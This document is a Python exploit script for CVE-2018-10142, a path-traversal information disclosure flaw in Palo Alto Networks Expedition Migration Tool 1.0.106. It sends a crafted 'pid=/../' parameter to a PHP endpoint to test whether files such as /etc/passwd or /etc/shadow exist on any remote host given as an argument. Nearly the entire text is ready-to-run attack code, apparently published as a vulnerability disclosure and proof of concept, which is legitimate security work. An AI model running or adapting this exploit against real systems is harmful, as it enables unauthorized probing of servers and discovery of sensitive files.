# Exploit Author: paragonsec @ Critical Start
# Vendor Homepage: https://live.paloaltonetworks.com/t5/Expedition-Migration-Tool/ct-p/migration_tool
# Software Link: https://paloaltonetworks.app.box.com/s/davuvo65k727nm7feuug0d783zo6fjx8
# Version: 1.0.106
# Tested on: Linux
# CVE : 2018-10142
 
#!/usr/bin/env python
  
import argparse
import requests
import sys
import collections
 
#Colors
OKRED = &#039;\033[91m&#039;
OKGREEN = &#039;\033[92m&#039;
ENDC = &#039;\033[0m&#039;
 
parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument(&#039;--file&#039;, help = &#039;File to check (e.g /etc/passwd, /etc/shadow)&#039;)
args = parser.parse_args()
 
# Check to ensure at least one argument has been passed
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
 
rhost = args.rhost
rfile = args.file
 
exploit_url = "http://" + rhost + "/API/process/checkPidStatus.php"
  
headers = [
    (&#039;User-Agent&#039;,&#039;Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&#039;),
    (&#039;Accept&#039;, &#039;application/json, text/javascript, */*; q=0.01&#039;),
    (&#039;Accept-Language&#039;, &#039;en-US,en;q=0.5&#039;),
    (&#039;Accept-Encoding&#039;, &#039;gzip, deflate&#039;),
    (&#039;Connection&#039;, &#039;close&#039;)
]
  
# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)
  
# Setting up GET body parameters
body = "pid=/../" + rfile
 
print(OKGREEN + "Author: " + ENDC + "paragonsec @ Critical Start (https://www.criticalstart.com)")
print(OKGREEN + "CVE: " + ENDC + "2018-10142")
print(OKGREEN + "Description: " + ENDC + "Information Disclosure in Expedition Migration Tool")
print(OKGREEN + "Vuln Versions: " + ENDC + "< 1.0.107\n")
 
print(OKGREEN + "[+]" + ENDC + "Running exploit...")
 
s = requests.Session()
 
req = requests.post(exploit_url, headers=headers, data=body)
if "false" not in req.text:
    print(OKGREEN + "[+]" + ENDC + "Exploit worked! " + rfile + " exists!\n")
else:
    print(OKRED + "[!]" + ENDC + "File " + rfile + " does not exist!\n")

